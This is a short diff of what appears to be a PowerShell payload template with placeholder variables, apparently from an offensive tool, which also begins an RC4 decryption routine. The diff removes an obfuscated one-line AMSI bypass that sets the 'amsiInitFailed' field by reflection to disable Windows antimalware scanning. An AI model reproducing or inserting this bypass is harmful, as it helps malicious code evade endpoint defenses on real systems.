@@ -1,5 +1,3 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi%{random_string}Failed'.replace('%{random_string}','Init'),'NonPublic,Static').SetValue($null,$true)
-
 function %{func_rc4_decrypt} {
     param([Byte[]]$%{var_rc4buffer})
 
